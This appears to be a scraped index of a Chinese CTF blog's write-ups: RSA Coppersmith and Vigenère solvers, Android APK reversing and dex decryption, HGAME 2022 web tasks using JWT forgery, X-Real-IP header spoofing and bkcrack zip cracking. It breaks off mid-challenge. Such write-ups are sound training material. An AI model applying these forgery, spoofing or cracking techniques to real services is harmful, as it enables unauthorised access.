0x807c1395b8128e6de865ab20dd2a39684f6831464553c65215cfe2861192657b6938d227c75e902ae858fdbd8b118c8522c08a3bf978bb203bc1644fe526f2de55b065b0507958 已知p高位可以使用Coppersmith Attack方法，但需要至少576位,求出568位,差了2个十六进制数,这里需要爆破，sage代码如下： n= 0x4a2c6dd9af83d8cc06b4e721475e9d8a9bce1de6ddd43be7658f13bb5c5b452e9f42d9d77b8c5c3e50ef64e0edc524903e8ee759d805a63cfe613ec022115d54e73724ced3bfff73e1872b7b35b040537f8ac89523d9e2860199d6d0b1c4d7830ee5b468bd7406990ffa29caa2d8fad285b3dba209b34b427d749d7e2aebded78f49e5017bfeec1cb9f72e63506d82af561a4858f652d3fb152526c10c7e4c5e15c84803efac675fb9297d915bd1e2eda5a5de3d48bbf68380303e0d8de81704fff8c9f07ae4d15212b9066227583345425ba7a04e06fd0c16ec6bfdd764318587d1bfe76a9834043b16392018e192456cb3ea994d2a187cabfa706efbee8dbf p = 0x807c1395b8128e6de865ab20dd2a39684f6831464553c65215cfe2861192657b6938d227c75e902ae858fdbd8b118c8522c08a3bf978bb203bc1644fe526f2de55b065b0507958 import string dic = string.digits + \"abcdef\" for a in dic: for b in dic: pp = hex(p) + a + b #p需要用0补全到1024位 pp += '0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' #要加的数字与补全p时0的个数有关 pp = int(pp, 16) p_fake = pp+0x10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 pbits = 1024 kbits = pbits-576 pbar = p_fake \u0026 (2^pbits-2^kbits) PR.\u003cx\u003e = PolynomialRing(Zmod(n)) f = x + pbar try: x0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root \u003c 2^kbits with factor \u003e= n^0.4 p = x0 + pbar print(\"p = \"+str(p)) except: pass 求出p后常规解即可。 ","date":"2022-02-28","objectID":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/:8:0","tags":["CTF"],"title":"2月CTF练习","uri":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"\r## 0x00 easyjava\rjeb打开，分析关键代码，首先我们知道flag{}内的内容通过v4和v5加密得出的v3，最后为wigwrkaugala，所以逆推出解密的步骤就能得到flag。分析参考：https://www.cnblogs.com/cainiao-chuanqi/p/13565030.html 先分析v4，得到是c的数组左移2位，结果是17 23 7 22 1 16 6 9 21 0 15 5 10 18 2 24 4 11 3 14 19 12 20 13 8 25 再分析v5，得到c的数组左移3位，结果是21 4 24 25 20 5 15 9 17 6 13 3 18 12 10 19 0 22 2 11 23 1 8 7 14 16 b类的a函数，该函数首先获取传进来的字符在字符串b.b中的索引，然后得到在b类中定义的整形数组中与该索引相等的在数组中的索引，然后调用b类的a()函数，将b类中数组与字符串左移一位，然后返回该数组索引。 a类中的a(int)函数，该函数首先获取与传进来的参数相等的数组中的值的索引，然后获取在字符串中索引为该数组索引的字符，最后返回该字符，当然，其中也调用a()函数，但是该函数要求等于25，所以形同虚设。 所以整理解密的脚本如下： cipherText = 'wigwrkaugala'\raArray = [21,4,24,25,20,5,15,9,17,6,13,3,18,12,10,19,0,22,2,11,23,1,8,7,14,16]\raString = 'abcdefghijklmnopqrstuvwxyz'\rbArray = [17,23,7,22,1,16,6,9,21,0,15,5,10,18,2,24,4,11,3,14,19,12,20,13,8,25]\rbString = 'abcdefghijklmnopqrstuvwxyz'\rdef changeBArrayandString():\rglobal bString\rglobal bArray\rchArray = bArray[0]\rchString = bString[0:1]\rfor i in range(len(bArray) - 1):\rbArray[i] = bArray[i + 1]\rbArray[len(bArray) - 1] = chArray\rbString = bString[1:]\rbString += chString\rdef getBchar(ch):\rv2 = bArray[ch]\rarg = bString[v2]\rchangeBArrayandString()\rreturn arg\rdef getAint(ch):\rglobal aString\rglobal aArray\rv1 = aString.index(ch)\rarg5 = aArray[v1]\rreturn arg5\rflag =''\rfor k in cipherText:\rv0 = getAint(k)\rflag += getBchar(v0)\rprint('flag{' + flag + '}')\r","date":"2022-02-07","objectID":"/2022-02-07-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mobile%E6%96%B0%E6%89%8B%E7%AF%872/:0:0","tags":["Web安全","CTF"],"title":"攻防世界-mobile（新手篇2）","uri":"/2022-02-07-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mobile%E6%96%B0%E6%89%8B%E7%AF%872/"},{"categories":["WriteUp"],"content":"0x01 RememberOther 压缩包解压后，得到一个word文档和apk，文档内容是不懂安卓，所以就只是和安卓扯了扯边，，，Have fun~，点开可以看到需要输入用户名和一个16位的注册码。 jeb查看源代码，我们知道是经过checkSN函数的判断后，输出了一段字符，可能和flag有关，那么我们下一步就是要获取这个字符串，下面有三种方法。 方法1：我们能够在程序里看到输出的字符串是在程序中调用的，那它很可能存在程序的某段代码中，搜索发现，字符串在strings.xml中。 方法2：在分析checkSN函数时，惊奇地发现，在用户名和注册码都不填写的情况下会返回true。 方法3：分析checkSN函数可知，它是将用户名进行md5处理后，取所有的奇数位置的数字组合，组成16位sn再与注册码进行比较。 python脚本如下： import hashlib\rm = hashlib.md5()\rm.update(b'123')\rx = m.hexdigest()\rsn = ''\rfor i in range(len(x)):\rif i%2 == 0:\rsn += x[i]\rprint (sn)\r总之，最后得到b3241668ecbeb19921fdac5ac1aafa69，解密下md5，得到YOU_KNOW_，结合 word 中的提示，整理得到flag: YOU_KNOW_ANDROID ","date":"2022-02-07","objectID":"/2022-02-07-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mobile%E6%96%B0%E6%89%8B%E7%AF%872/:1:0","tags":["Web安全","CTF"],"title":"攻防世界-mobile（新手篇2）","uri":"/2022-02-07-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mobile%E6%96%B0%E6%89%8B%E7%AF%872/"},{"categories":["WriteUp"],"content":"0x02 Ph0en1x-100 上模拟器，app功能是提交flag验证的。 上jeb分析代码，在主函数得到判断语句，接着往下分析。 encrypt和getFlag是从phcm库中调用的，导出库后，用ida分析。 encrypt函数，分析可知对字符串的每个字符的ascii值减一。 对于getFlag函数，由于该函数没有输入只有输出，所以可以通过APKIDE修改smali源码，在本来显示 Failed的地方，让其执行getFlag方法，将执行结果存入v1寄存器。 反编译后运行，可以得到一串字符串ek`fz@q2^x/t^fn0mF^6/^rb`qanqntfg^E`hq| 将字符串的ascii值移位得到flag flag = ''\rfor i in c:\rflag += chr(ord(i) + 1)\rprint(flag)\r","date":"2022-02-07","objectID":"/2022-02-07-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mobile%E6%96%B0%E6%89%8B%E7%AF%872/:2:0","tags":["Web安全","CTF"],"title":"攻防世界-mobile（新手篇2）","uri":"/2022-02-07-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mobile%E6%96%B0%E6%89%8B%E7%AF%872/"},{"categories":["WriteUp"],"content":"0x03 黑客精神 JEB进行反编译，发现在MainActivity点击按钮后就弹出弹框，而后跳转到RegActivity界面去，在该界面点击注册后，调用了so层函数saveSN。 跳转到saveSN函数所在的类MyApp，进一步分析代码。 接着分析libmyjni.so文件，在JNI_OnLoad函数中注册了initSN、saveSN和work函数，代码如下 用IDA分析so文件发现在java层注册的native函数都是动态注册的，发现对应的函数n1、n2、n3。 setValue函数的作用是设置com/gdufs/xman/MyApp类的静态字段m的值，输入的注册码通过一系列的计算后得到的值，initSN函数会判断/sdcard/reg.dat文件的内容是否为\"EoPAoY62@ElRD\"，如果得到的值正确，则输入的注册码即为flag。 输入\"EoPAoY62@ElRD\"，通过模拟器进行查看。 ","date":"2022-02-07","objectID":"/2022-02-07-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mobile%E6%96%B0%E6%89%8B%E7%AF%872/:3:0","tags":["Web安全","CTF"],"title":"攻防世界-mobile（新手篇2）","uri":"/2022-02-07-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mobile%E6%96%B0%E6%89%8B%E7%AF%872/"},{"categories":["WriteUp"],"content":"0x04 easy-dex dex里面包含了所有app代码，利用反编译工具可以获取java源码。理解并修改dex文件，就能更好的apk破解和防破解。 dex应该是藏在了so中，先寻找android_main函数，Native Activity的入口函数。qmemcpy函数将加密后的dex文件加载进来了，可以发现加密后的dex文件首地址为0x7004(IDA使用F5后，要使用那一块内存空间地址直接是以\u0026unk地址命名的)，长度为0x3ca10。 直接在静态下执行dump脚本 import idaapi\raddr = 0x7004\rsize = 0x3ca10\rwith open('dump','wb') as f:\rf.write(get_bytes(addr,size))\rprint('[+] dump end')\r这里直接用大佬的python解密dex脚本 import zlib\rwith open('dump','rb') as f:\rdata1 = f.read()\rdata = list(data1)\rcount = 0\rwhile True:\rif count \u003c= 0x59:\rcount_tmp = (int)(count / 10)\rif count % 10 == 9:\rsize = 0x3ca10\rsize_tmp = (int)(size / 10)\rxor = (count_tmp + 1) * size_tmp\rif (size_tmp * count_tmp) \u003c xor:\rindex = size_tmp * count_tmp\rwhile size_tmp:\rdata[index] = data[index] ^ count\rindex = index + 1\rsize_tmp = size_tmp - 1\rif count == 89:\rwhile xor \u003c size:\rdata[xor] = data[xor] ^ 0x59\rxor = xor + 1\relse:\rbreak\rcount = count + 1\rfilebytes = bytes(data)\rwith open('easy-dex.dex','wb') as f1:\rf1.write(zlib.decompress(filebytes))\rprint('[+] decrypt end')\rjeb分析解压后的dex文件，MainActivity.java有一个按钮监听事件，触发后调用了a.java里面的onClick函数，调用了MainActivity里面的a函数。 编写脚本，求出密文iE3y2hEF1izgbVUfGKWQrUCtgFQFop7iEkbmRwWdwsZ1HdQGcPxRVAkWzV/eDC9N import base64 m = [-120, 77, -14, -38, 17, 5, -42, 44, -32, 109, 85, 0x1F, 24, -91, -112, -83, 0x40, -83, -128, 84, 5, -94, -98, -30, 18, 70, -26, 71, 5, -99, -62, -58, 0x75, 29, -44, 6, 0x70, -4, 81, 84, 9, 22, -51, 0x5F, -34, 12, 0x2F, 77] res = [] for i in m: res.append(i \u0026 0xff) b = bytes(res) print(base64.b64encode(b)) 再根据a函数，得出明文+key = 密文。 在string.xml资源文件中发现字符串I have a male fish and a female fish. 怀疑是TwoFish加密，输入key值和加密文本，得到flag。 ","date":"2022-02-07","objectID":"/2022-02-07-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mobile%E6%96%B0%E6%89%8B%E7%AF%872/:4:0","tags":["Web安全","CTF"],"title":"攻防世界-mobile（新手篇2）","uri":"/2022-02-07-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mobile%E6%96%B0%E6%89%8B%E7%AF%872/"},{"categories":["WriteUp"],"content":"0x05 你是谁 点击皇上的图片，听到语音“你是个好人，但是我们不适合。”，白色的圆可以被点击。 在MainActivity中找到注释中存在@Override // com.iflytek.cloud.InitListener，搜索发现来源是科大讯飞的语音集成。在background类中发现编码，20667 25105 26159 36924的中文unicode编码为傻我是逼。 推理得出编码前的flag顺序应该是25105 26159 20667 36924。 ","date":"2022-02-07","objectID":"/2022-02-07-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mobile%E6%96%B0%E6%89%8B%E7%AF%872/:5:0","tags":["Web安全","CTF"],"title":"攻防世界-mobile（新手篇2）","uri":"/2022-02-07-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mobile%E6%96%B0%E6%89%8B%E7%AF%872/"},{"categories":["WriteUp"],"content":"0x00 Easy RSA 描述 这 RSA 不是有手就行？！ (100分的题能拿125分，这不血赚) from math import gcd from random import randint from gmpy2 import next_prime from Crypto.Util.number import getPrime from secret import flag def encrypt(c): p = getPrime(8) q = getPrime(8) e = randint(0, p * q) while gcd(e, (p - 1) * (q - 1)) != 1: e = int(next_prime(e)) return e, p, q, pow(ord(c), e, p * q) if __name__ == '__main__': print(list(map(encrypt, flag))) # [(12433, 149, 197, 104), (8147, 131, 167, 6633), (10687, 211, 197, 35594), (19681, 131, 211, 15710), (33577, 251, 211, 38798), (30241, 157, 251, 35973), (293, 211, 157, 31548), (26459, 179, 149, 4778), (27479, 149, 223, 32728), (9029, 223, 137, 20696), (4649, 149, 151, 13418), (11783, 223, 251, 14239), (13537, 179, 137, 11702), (3835, 167, 139, 20051), (30983, 149, 227, 23928), (17581, 157, 131, 5855), (35381, 223, 179, 37774), (2357, 151, 223, 1849), (22649, 211, 229, 7348), (1151, 179, 223, 17982), (8431, 251, 163, 30226), (38501, 193, 211, 30559), (14549, 211, 151, 21143), (24781, 239, 241, 45604), (8051, 179, 131, 7994), (863, 181, 131, 11493), (1117, 239, 157, 12579), (7561, 149, 199, 8960), (19813, 239, 229, 53463), (4943, 131, 157, 14606), (29077, 191, 181, 33446), (18583, 211, 163, 31800), (30643, 173, 191, 27293), (11617, 223, 251, 13448), (19051, 191, 151, 21676), (18367, 179, 157, 14139), (18861, 149, 191, 5139), (9581, 211, 193, 25595)] 根据题目我们知道列表里的每一个元组就能通过rsa解密出一个字符，然后把他们拼凑在一起就能得到flag，脚本如下： flag = ''\rfor i in range(len(res)):\re = res[i][0]\rp = res[i][1]\rq = res[i][2]\rc = res[i][3]\rn = p*q\rphi = (p-1)*(q-1)\rd = gmpy2.invert(e,phi)\rflag += chr(pow(c,d,n))\rprint(flag)\r","date":"2022-01-29","objectID":"/2022-01-29-hgame-2022-week1writeup/:1:0","tags":["Web安全","CTF"],"title":"HGAME 2022 week1(writeup)","uri":"/2022-01-29-hgame-2022-week1writeup/"},{"categories":["WriteUp"],"content":"0x01 饭卡的uno 描述 饭卡今天第一天学iot 然后他的好朋友Actue让他先去学uno 然后悄悄给饭卡塞了一个固件 一开始被iot吓到了，后来发现解出来的人挺多的，用010打开文件，发现flag。 ","date":"2022-01-29","objectID":"/2022-01-29-hgame-2022-week1writeup/:2:0","tags":["Web安全","CTF"],"title":"HGAME 2022 week1(writeup)","uri":"/2022-01-29-hgame-2022-week1writeup/"},{"categories":["WriteUp"],"content":"0x02 Flag Checker 描述 A Flag Checker,can you pass this check? 用jeb打开文件，分析代码，怀疑是rc4加密，carol是key，mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=是加密后的密文。 找个在线网站，解密rc4，得到flag。 ","date":"2022-01-29","objectID":"/2022-01-29-hgame-2022-week1writeup/:3:0","tags":["Web安全","CTF"],"title":"HGAME 2022 week1(writeup)","uri":"/2022-01-29-hgame-2022-week1writeup/"},{"categories":["WriteUp"],"content":"0x03 好康的流量 描述 总所周知 饭卡是个LSP并十分喜欢向其他人推销他的涩图 让我们去悄悄康康他发了什么 wireshark打开追踪流，发现一段很像图片的base64 放到cyberchef里面转一下 另存图片后用stegsolve在Green plane 2得到一段条形码，用支付宝扫描得到hgame{ez_1mg_ 然后发现lsb隐写，后半段为Steg4n0graphy} ","date":"2022-01-29","objectID":"/2022-01-29-hgame-2022-week1writeup/:4:0","tags":["Web安全","CTF"],"title":"HGAME 2022 week1(writeup)","uri":"/2022-01-29-hgame-2022-week1writeup/"},{"categories":["WriteUp"],"content":"0x04 群青(其实是幽灵东京） 描述 4CTU3从小就是Yoasobi的狂热粉丝 今天它给大家带来了一首它觉得很好听的老歌 它说你要用多感官去感觉 用au打开wav，发现Yoasobi 在详细信息里面，有暗示使用silenteye 解密得到一段url，浏览器输入把附件下载下来。 得到S_S_T_V.wav看名字听声音就知道需要把sstv信号转成图片，手机上用robot36读取，得到一张二维码，扫描即可得到结果hgame{1_c4n_5ee_the_wav}。 ","date":"2022-01-29","objectID":"/2022-01-29-hgame-2022-week1writeup/:5:0","tags":["Web安全","CTF"],"title":"HGAME 2022 week1(writeup)","uri":"/2022-01-29-hgame-2022-week1writeup/"},{"categories":["WriteUp"],"content":"0x05 蛛蛛…嘿嘿♥我的蛛蛛 描述 蛛蛛…嘿嘿…我的蛛蛛…我的蛛蛛正在满地找头？？？ 需要不断点击进入下一关，找到flag，感觉没多少关，可以手撕。 过第100关后得到 查看源代码，没有啥信息，想起题目说的头，联想到header，用插件打开发现flag。 官方wp提供的爬虫脚本，这里微调一下 import requests,regex\rnextURL = base = 'http://hgame-spider.vidar.club/xxx'\rwhile 1:\rkeys = regex.findall('\u003ca href=\\\"(\\S+)\\\"\u003e点我试试\u003c/a\u003e',requests.get(nextURL).text)\rif len(keys) == 0:\rbreak\rnextURL = base + keys[0]\rprint(nextURL)\rprint(requests.get(nextURL).headers)\r","date":"2022-01-29","objectID":"/2022-01-29-hgame-2022-week1writeup/:6:0","tags":["Web安全","CTF"],"title":"HGAME 2022 week1(writeup)","uri":"/2022-01-29-hgame-2022-week1writeup/"},{"categories":["WriteUp"],"content":"0x06 Tetris plus js小游戏，找到对应的js文件checking.js，发现可疑代码。 base64解密得到flag和一段乱码，明显不是真的flag。然后把后面一大段js代码输入控制台，得到flag。 ","date":"2022-01-29","objectID":"/2022-01-29-hgame-2022-week1writeup/:7:0","tags":["Web安全","CTF"],"title":"HGAME 2022 week1(writeup)","uri":"/2022-01-29-hgame-2022-week1writeup/"},{"categories":["WriteUp"],"content":"0x07 这个压缩包有点麻烦 描述 这个压缩包，它真的可以打开吗？ 压缩包注释里面有Pure numeric passwords within 6 digits are not safe!，所以直接爆破即可解出下一层。 在ReadMe里面写有I don’t know if it’s a good idea to write down all the passwords.，还给出了password-note文件，包含压缩包的密码，所以可以用字典攻击进入下一层。 ReadMe的内容是If you don’t like to spend time compressing files, just stores them.感觉没什么用，这里卡了很久，然后试试明文攻击，bkcrack -C flag.zip -c README.txt -p README.txt。 得到key后，提取一下flag.jpg文件。 binwalk发现存在压缩包，提取出来。 压缩包伪加密，解压得到真flag为hgame{W0w!_y0U_Kn0w_z1p_3ncrYpt!} ","date":"2022-01-29","objectID":"/2022-01-29-hgame-2022-week1writeup/:8:0","tags":["Web安全","CTF"],"title":"HGAME 2022 week1(writeup)","uri":"/2022-01-29-hgame-2022-week1writeup/"},{"categories":["WriteUp"],"content":"0x08 Fujiwara Tofu Shop 描述 昨晚我输给一辆AE86。他用惯性漂移过弯，他的车很快，我只看到他有个豆腐店的招牌。 burp抓包，添加Referer字段 通行证联想到User-Agent，修改后重发。 明显修改cookie，响应包里面有flavor为草莓的字段，所以格式应该差不多。 在响应包找到gasline，在请求包把值设为100。 本地请求，尝试X-Forwarded-For发现有拦截，尝试X-Real-IP得到flag。 解法2：把X-Forworded-For的ip写两遍 来自官方wp的笔记 IP 伪造和代理服务器有关，相关的请求头有X-Forworded-For,X-Real-IP,X-Client-IP等，至于那个请求头能成功伪造 IP，得参考具体的网络环境，编程语言，服务端框架和服务端配置。返回头里给出了后端框架：gin-gonic/gin，预期解法是让大家去查一查 gin 是怎样处理这些请求头的，不过好像没人去查www。(https://github.com/gin-gonic/gin/issues/1684) ","date":"2022-01-29","objectID":"/2022-01-29-hgame-2022-week1writeup/:9:0","tags":["Web安全","CTF"],"title":"HGAME 2022 week1(writeup)","uri":"/2022-01-29-hgame-2022-week1writeup/"},{"categories":["WriteUp"],"content":"0x09 English Novel 描述 为了学好四六级，协会里某不知名的康师傅决定通过看英文小说来提高自己的英语水平。 可不知道为什么，下载来的小说竟然都被打乱并加密了。 他费尽千辛万苦重要找到了一部分小说的原文，你能帮帮他么？ 我们能拿到部分明文和密文，但他们的顺序是打乱的，难搞。其实我们可以用大小排序，然后发现每个part最多是410字节，我们拿到的flag.enc的长度是45，所以可以先从短的找出对应，推理出key。 m1 = '\"Then we have won back what we had before,\" said Boxer.'\rc1 = '\"Nhoa ul mwmv bbd kfez wbzl dm ded epcnrk,\" uiii Zogaq.'\rm2 = 'ge of wearing green ribbons on their tails on Sundays.'\rc2 = 'wy ys ulyweex leusw txrbimk vv plequ qzirv yp Szabaho.'\rm3 = 'to be more frightened of the pigs or of the human visitors.'\rc3 = 'ji lr kvpj wialujswjf ef szr xecw wu le zkh jcmfa vrohxivp.'\rm4 = 'arter of an hour and put an end to any chance of discussion.'\rc4 = 'qltoe mm fj ygze owi ekt zf lvz xo dyv cndqmg ok bibytwmmle.'\rm5 = 'apoleon himself, which was always served to him in the Crown Derby soup tureen.'\rc5 = 'qjovrrl fnijvdk, kqnew wur nsewuw ahcsdd wr jqm vl cdd Wvlnr Knxqi puxa imjkgf.'\r这里找到五段对应的明文和密文，然后分析算法。 def decrypt(data, key):\rassert len(data) \u003c= len(key)\rresult = \"\"\rfor i in range(len(data)):\rif data[i].isupper():\rresult += chr((ord(data[i]) - ord('A') + key[i]) % 26 + ord('A'))\relif data[i].islower():\rresult += chr((ord(data[i]) - ord('a') + key[i]) % 26 + ord('a'))\relse:\rresult += data[i]\rreturn result\r可以通过爆破key[i]的值来与明文进行对比，从而得到key的值，同时，只有一段文字是不够的，因为中间有特殊符号和空格等，key会跳过这些，所以需要多段的key来组合。 def getkey(c,m):\rkey=[]\rfor i in range(len(c)):\rresult=''\rl=[]\rif c[i].isupper():\rfor j in range(0,256):\rresult = chr((ord(c[i]) - ord('A') + j) % 26 + ord('A'))\rif result==m[i]:\rkey.append(j)\rbreak\relif c[i].islower():\rfor j in range(0,256):\rresult = chr((ord(c[i]) - ord('a') + j) % 26 + ord('a'))\rif result==m[i]:\rkey.append(j)\rbreak\relse:\rkey.append(-1)\rreturn key\r运行后得到 key1= [-1, 6, 0, 16, 13, -1, 2, 19, -1, 21, 4, 9, 9, -1, 21, 13, 10, -1, 17, 21, 24, 11, -1, 0, 6, 1, 8, -1, 19, 18, -1, 4, 22, 0, -1, 23, 15, 3, 1, 0, 20, -1, -1, -1, 24, 18, 0, 21, -1, 2, 0, 17, 4, 1, -1] key2= [10, 6, -1, 16, 13, -1, 2, 19, 2, 21, 4, 9, 9, -1, 21, 13, 10, 12, 17, -1, 24, 11, 10, 0, 6, 1, 8, -1, 19, 18, -1, 4, 22, 0, 18, 23, -1, 3, 1, 0, 20, 23, -1, 16, 24, -1, 0, 21, 13, 2, 0, 17, 4, -1] key3= [10, 6, -1, 16, 13, -1, 2, 19, 2, 21, -1, 9, 9, 8, 21, 13, 10, 12, 17, 21, 24, -1, 10, 0, -1, 1, 8, 13, -1, 18, 4, 4, 22, -1, 18, 23, -1, 3, 1, -1, 20, 23, 23, -1, 24, 18, 0, 21, 13, -1, 0, 17, 4, 1, 22, 6, 22, 3, -1] key4= [10, 6, 0, 16, 13, -1, 2, 19, -1, 21, 4, -1, 9, 8, 21, 13, -1, 12, 17, 21, -1, 11, 10, 0, -1, 1, 8, -1, 19, 18, 4, -1, 22, 0, -1, 23, 15, 3, -1, 0, 20, 23, 23, 16, 24, -1, 0, 21, -1, 2, 0, 17, 4, 1, 22, 6, 22, 3, 9, -1] key5= [10, 6, 0, 16, 13, 23, 2, -1, 2, 21, 4, 9, 9, 8, 21, -1, -1, 12, 17, 21, 24, 11, -1, 0, 6, 1, -1, 13, 19, 18, 4, 4, 22, -1, 18, 23, 15, 3, 1, 0, -1, 23, 23, -1, 24, 18, 0, -1, 13, 2, -1, 17, 4, 1, -1, 6, 22, 3, 9, 22, -1, 19, 17, 20, 11, 16, -1, 3, 20, 23, 15, -1, 11, 8, 8, 20, 24, 8, -1] 整理得到最后的key key=[10,6,0,16,13,23,2,19,2,21,4,9,9,8,21,13,10,12,17,21,24,11,10,0,6,1,8,13,19,18,4,4,22,0,18,23,15,3,1,0,20,23,23,16,24,18,0,21,13,2,0,17,4,1] 使用加密方法得到flag ","date":"2022-01-29","objectID":"/2022-01-29-hgame-2022-week1writeup/:10:0","tags":["Web安全","CTF"],"title":"HGAME 2022 week1(writeup)","uri":"/2022-01-29-hgame-2022-week1writeup/"},{"categories":["WriteUp"],"content":"0x0A easy_auth 描述 尊贵的admin写了个todo帮助自己管理日常，但他好像没调试完就部署了….一个月后，当他再一次打开他的小网站，似乎忘记了密码…他的todo之前记录了很重要的东西，快帮帮他 不要爆破！ 首先在用户登录页面发现存在login.js文件，关键代码为匹配用户名密码，设置token。 这里注册用户后登录，抓包，在响应包里获取到token。 联想到jwt伪造，修改username，重发包。 发送包，发现被拦截了有问题。 这里卡了挺久的，后来又注册了一个用户进行实验，发现验证和id有关，猜测admin的id为1，继续伪造jwt，成功获取到flag。 ","date":"2022-01-29","objectID":"/2022-01-29-hgame-2022-week1writeup/:11:0","tags":["Web安全","CTF"],"title":"HGAME 2022 week1(writeup)","uri":"/2022-01-29-hgame-2022-week1writeup/"},{"categories":["WriteUp"],"content":"0x0B Matryoshka(复现) 描述 某天饭卡捡到了张奇怪的纸条。 上面写满了奇奇怪怪的字符。 纸条背面还写着奇怪的话：“Caesar：21; Vigenère:hgame”。 你能看懂上面写了什么吗？ 文件里面是盲文 ⠨⠨⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠤⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠨⠨⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠨⠨⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠤⠤⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠤⠤⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠨⠤⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠨⠨⠌⠨⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠨⠨⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠤⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠨⠨⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠤⠤⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠨⠨⠨⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠨⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠤⠨⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠨⠨⠨⠌⠨⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠤⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠨⠨⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠤⠤⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠤⠨⠌⠨⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠨⠨⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠤⠤⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠤⠤⠤⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠨⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠨⠨⠨⠌⠨⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠨⠨⠨⠨⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠨⠨⠨⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠤⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠤⠤⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠤⠤⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠨⠨⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠤⠤⠤⠌⠨⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠨⠤⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠨⠨⠨⠨⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠤⠤⠤⠌⠨⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠤⠤⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠨⠨⠨⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠨⠌⠤